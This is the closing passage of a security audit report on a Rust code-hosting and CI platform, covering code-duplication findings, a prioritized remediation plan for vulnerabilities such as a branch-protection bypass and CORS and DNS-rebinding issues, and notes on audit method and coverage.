- **Cross-crate duplication is low.** Identical normalized function bodies: only 2 pairs (migration `down` helpers; test `table_sql`). Same-name spreads (`extract_metadata` ×8 package adapters, `increment_download_count` ×4 ops files) are per-table/per-format by necessity — the ones worth unifying are `increment_download_count` (single generic `bump_counter(table, id)` helper) and the private-IP classifier, which `net.rs` already shares between webhook and git stacks but *duplicates the surrounding client policy* for.
- **`rg-http/src/api/packages.rs` (203 KB / 46 handlers)** and **`rg-ci/src/lib.rs` (327 KB)** are monoliths — hard to audit, merge-conflict-prone. Split by package format / by pipeline lifecycle stage. Large-file concentration correlated with 3 of the 4 failed audit passes in this review — that's a maintainability signal in itself.
- **Dead/drifted items found:** stale `require_blob_digest` doc-ref (L-7); the deleted `check_push_allowed` duplicate (documented, good); `ARCHITECTURE.md` dep-graph drift (L-8); `fortorgekeep.example.toml` `external_secret` placeholder is validated for JWT but nothing validates the CI shared secret strength (it's compare-only, low risk).

---

## 7. Prioritized remediation plan

1. **F-1** branch-protection bypass (contents API) — gate service fns or route pushes through `push_rules`.
2. **F-2** fork-PR secret gating in `job_environment`.
3. **F-3** CORS default → no CORS unless configured; never mirror+credentials.
4. **F-5** pin DNS resolution for the outbound client (rebinding).
5. **F-4** scope runner tokens.
6. **F-7** validate `branch`, ref-CAS writes, cap content size; **F-9** LFS size cap + digest verify.
7. **F-12/F-13** merge-queue re-enqueue + transactional resume; **F-8** refname validation; **F-11** pack caps; **F-14** config 0600.
8. Rules cleanup: convert the 71 panic-family sites (worst first: `repo_ops.rs:1128`, `oci.rs:979/1001`), `catch (e: unknown)`, `with_capacity` sweep, decide `dyn` → enum/generics policy, `tokio::fs` for async paths.

---

## 8. Appendix — audit coverage & methodology notes

- **Deterministic sweeps run:** panic-family counts (3 refinement passes to exclude tests properly), `clone`/`to_owned`, `Vec/HashMap::new`, `dyn`, `unsafe`, `static mut`, raw-SQL construction (`format!`→SQL, `Statement::from_string` — confined to migrations/tests), secrets-in-repo patterns (only example placeholders found, and JWT placeholder is startup-rejected), blocking `std::fs` in async, function-body duplication hashing, TS `any`/`!`/`eval`/`@html`/ts-ignore.
- **Deep audits (worker fan-out):** auth primitives; route gating; git smart-HTTP; contents API (2 passes); packages; OCI (2 passes); SSH; import/mirror; webhooks+net; PR merge; merge queue; repo service writes; repo lifecycle; user+LFS; DB ops; branch protection end-to-end; CI secrets; runner; CLI config/serve; MCP; web frontend. Worker claims for all CRITICAL/HIGH findings were **re-verified natively** (direct source reads) before inclusion: F-1 (`repo/service.rs:3051-3489`), F-3 (`routes.rs:243-250`), F-6 (HTTP merge site), F-7, F-9 (`lfs.rs:437` boundary), branch-protection call-sites, `digest_parts`, cookie flags, `validate_repo_path`.
- **Known limitations:** no dynamic testing (no live server was started; POCs are constructed from verified code paths, not executed); Cargo/clippy pedantic compliance not compiled; Windows `unsafe` audited by reading only; SSO provider flows audited at cookie/state level, not per-provider.
